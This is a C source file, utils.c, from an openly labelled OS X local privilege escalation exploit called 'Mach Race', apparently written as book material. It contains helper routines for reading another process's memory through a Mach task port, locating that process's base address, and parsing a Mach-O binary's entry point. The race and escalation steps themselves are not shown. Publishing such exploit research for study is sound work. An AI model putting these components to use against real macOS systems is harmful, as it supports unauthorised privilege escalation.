/*
 * ______  ___            ______
 * ___   |/  /_____ _________  /_
 * __  /|_/ /_  __ `/  ___/_  __ \
 * _  /  / / / /_/ // /__ _  / / /
 * /_/  /_/  \__,_/ \___/ /_/ /_/
 * ________
 * ___  __ \_____ ___________
 * __  /_/ /  __ `/  ___/  _ \
 * _  _, _// /_/ // /__ /  __/
 * /_/ |_| \__,_/ \___/ \___/
 *
 * Mach Race OS X Local Privilege Escalation Exploit
 *
 * Created by reverser on 27/04/15.
 * Copyright (c) fG!, 2015, 2016. All rights reserved.
 * reverser@put.as - https://reverse.put.as
 *
 * utils.c
 *
 */

#include <mach-o/dyld_images.h>
#include <mach-o/loader.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/mman.h>

#include "utils.h"
#include "logging.h"

kern_return_t
readmem(mach_port_t port, void *buffer, const uint64_t target_addr, const size_t size)
{
    mach_vm_size_t outsize = 0;
    kern_return_t kr = mach_vm_read_overwrite(port, target_addr, size, (mach_vm_address_t)buffer, &outsize);
    if (kr != KERN_SUCCESS) {
        ERROR_MSG("mach_vm_read_overwrite failed: %d (%s)", kr, mach_error_string(kr));
        return KERN_FAILURE;
    }
    return KERN_SUCCESS;
}

mach_vm_address_t
find_task_base_address(mach_port_t target_port)
{
    kern_return_t err;
    task_dyld_info_data_t task_dyld_info;
    mach_msg_type_number_t count = TASK_DYLD_INFO_COUNT;
    err = task_info(target_port, TASK_DYLD_INFO, (task_info_t)&task_dyld_info, &count);
    if (err != KERN_SUCCESS) {
        fprintf(stderr, "error getting task_info %x\n", err);
    }
    struct dyld_all_image_infos all_image_infos = {0};
    readmem(target_port, &all_image_infos, task_dyld_info.all_image_info_addr, sizeof(struct dyld_all_image_infos));
    size_t images_infos_size = all_image_infos.infoArrayCount * sizeof(struct dyld_image_info);
    struct dyld_image_info *image_infos = malloc(images_infos_size);
    readmem(target_port, image_infos, (mach_vm_address_t)all_image_infos.infoArray, images_infos_size);
    /* the main binary is at position 0
     * to iterate all over the array and compare strings we would need to
     * read the string pointer back with readmem() since we can't dereference
     * it directly because it's in another task memory space
     * let's keep it simple for book purposes
     */
    mach_vm_address_t image_load_address = (mach_vm_address_t)image_infos[0].imageLoadAddress;
    fprintf(stderr, "Main binary base address: 0x%llx\n", image_load_address);
    return image_load_address;
}

/* find entrypoint */
kern_return_t
find_entrypoint(char *target, mach_vm_address_t *entrypoint)
{
    int fd = 0;
    fd = open(target, O_RDONLY);
    if (fd < 0)
    {
        fprintf(stderr, "Can't open target file.");
        return KERN_FAILURE;
    }
    struct stat statbuf = {0};
    if (fstat(fd, &statbuf) < 0)
    {
        fprintf(stderr, "Can't fstat target.");
        close(fd);
        return KERN_FAILURE;
    }
    uint8_t *buf = mmap(0, statbuf.st_size, PROT_READ, MAP_SHARED, fd, 0);
    if (buf == MAP_FAILED)
    {
        fprintf(stderr, "Can't mmap target.");
        close(fd);
        return KERN_FAILURE;
    }
    close(fd);
    
    struct mach_header_64 *mh = (struct mach_header_64*)buf;
    if (mh->magic != MH_MAGIC_64)
    {
        return KERN_FAILURE;
    }
    if (mh->ncmds == 0 || mh->sizeofcmds == 0)
    {
        return KERN_FAILURE;
    }
    
    struct load_command *lc = (struct load_command*)(buf + sizeof(struct mach_header_64));
    struct segment_command_64 *text_cmd = NULL;
    
    for (uint32_t i = 0; i < mh->ncmds; i++)
    {
        if (lc->cmd == LC_SEGMENT_64)
        {
            struct segment_command_64 *sg = (struct segment_command_64*)lc;
            if (strncmp(sg->segname, "__TEXT", 16) == 0)
            {
                text_cmd = sg;
            }
        }
        if (lc->cmd == LC_MAIN)
        {
            if (text_cmd != NULL)
            {
                struct entry_point_command *ep = (struct entry_point_command*)lc;
                *entrypoint = text_cmd->vmaddr + ep->entryoff;
                return KERN_SUCCESS;
            }
        }
        /* untested, should work */
        if (lc->cmd == LC_UNIXTHREAD)
        {
            uint32_t flavor = *(uint32_t*)((char*)lc + sizeof(struct thread_command));
            if (flavor == x86_THREAD_STATE64)
            {
                x86_thread_state64_t *ts = (x86_thread_state64_t*)((char*)lc + sizeof(struct thread_command) + 2 * sizeof(uint32_t));
                *entrypoint = ts->__rip;
                return KERN_SUCCESS;
            }
            else
            {
                fprintf(stderr, "Unsupported flavor.");
                return KERN_FAILURE;
            }
        }
        lc = (struct load_command*)((char*)lc + lc->cmdsize);
    }
    return KERN_FAILURE;
}
